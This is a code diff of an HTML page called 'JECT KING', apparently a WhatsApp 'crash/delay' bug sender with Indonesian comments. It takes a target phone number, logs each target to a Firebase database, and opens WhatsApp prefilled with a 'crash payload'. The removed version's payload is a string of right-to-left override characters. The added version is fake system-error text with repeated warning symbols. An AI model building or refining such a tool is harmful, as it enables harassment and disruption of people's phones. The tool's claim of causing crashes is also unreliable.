@@ -3,48 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JECT KING - Admin Panel</title>
-    <!-- Firebase SDK -->
+    <title>JECT KING</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
         body { 
-            background: radial-gradient(circle, #2d004d 0%, #0d0d0d 80%); 
-            color: #fff; font-family: 'Segoe UI', sans-serif; 
+            background: #000; color: #bf00ff; font-family: 'Courier New', monospace; 
             display: flex; justify-content: center; align-items: center; 
             height: 100vh; margin: 0; 
         }
         .container { 
-            background: rgba(255, 255, 255, 0.05); 
-            padding: 30px; border-radius: 20px; 
-            box-shadow: 0 0 25px #bf00ff; 
-            border: 2px solid #bf00ff; 
-            text-align: center; width: 320px; 
+            background: #0d0d0d; padding: 30px; border-radius: 15px; 
+            box-shadow: 0 0 20px #4a0072; border: 1px solid #bf00ff; 
+            text-align: center; width: 300px; 
         }
-        h2 { color: #bf00ff; text-shadow: 0 0 10px #bf00ff; margin-bottom: 20px; }
         input, select, button { 
-            width: 100%; margin: 10px 0; padding: 15px; 
-            border-radius: 10px; border: 1px solid #4a0072; 
-            background: #1a1a1a; color: white; box-sizing: border-box; 
+            width: 100%; margin: 10px 0; padding: 12px; 
+            background: #000; border: 1px solid #bf00ff; color: #bf00ff; 
+            border-radius: 5px; box-sizing: border-box;
         }
-        button { 
-            background: linear-gradient(45deg, #4a0072, #bf00ff); 
-            cursor: pointer; font-weight: bold; font-size: 16px;
-            transition: 0.3s;
-        }
-        button:hover { background: #bf00ff; box-shadow: 0 0 15px #bf00ff; }
+        button { cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        button:hover { background: #bf00ff; color: #000; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>JECT KING</h2>
-    <input type="text" id="waNumber" placeholder="Contoh: 62812xxxx">
+    <h3>JECT KING</h3>
+    <input type="text" id="waNumber" placeholder="628+++">
     <select id="actionType">
-        <option value="Crash">Crash</option>
-        <option value="Delay">Delay</option>
+        <option value="Crash">CRASH</option>
+        <option value="Delay">DELAY</option>
     </select>
-    <button onclick="sendAction()">SEND & EXECUTOR</button>
+    <button onclick="sendAction()">SEND</button>
 </div>
 
 <script>
@@ -61,27 +52,25 @@
         const phone = document.getElementById('waNumber').value;
         const action = document.getElementById('actionType').value;
         
-        // Teks yang akan dikirim (teks bom/kosong)
-        const bombText = "‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮ ‮";
-        const statusMessage = (action === "Crash") ? "Mesin online crash" : "Mesin online delay";
+        // Payload teks panjang dengan karakter "invalid channel" dan "crash"
+        const crashPayload = "⚠ SYSTEM_FAILURE_DETECTION ⚠ \n" + 
+                             "Saluran Tidak Valid: 0x000000FF \n" +
+                             "Diteruskan dari: SERVER_ROOT_ADMIN \n" +
+                             "⚠ ".repeat(50) + "\n" +
+                             "ERROR_CODE_CRASH_READY_STATE_404";
 
         if (phone) {
-            // 1. Catat aksi ke Firebase
             db.ref('logs/').push({
                 target: phone,
                 type: action,
-                message: statusMessage,
+                status: "Executed",
                 timestamp: Date.now()
             }).then(() => {
-                // 2. Redirect ke WhatsApp dengan teks yang sudah diisi
-                // encodeURIComponent digunakan agar teks terbaca oleh URL
-                const url = `https://wa.me/${phone}?text=${encodeURIComponent(bombText)}`;
-                window.location.href = url;
-            }).catch((error) => {
-                alert("Gagal terhubung ke Firebase: " + error.message);
-            });
+                // Mengirim ke WA dengan payload crash
+                window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(crashPayload)}`;
+            }).catch((e) => alert("Firebase Error: " + e.message));
         } else {
-            alert("Harap masukkan nomor WhatsApp!");
+            alert("Masukkan nomor target!");
         }
     }
 </script>
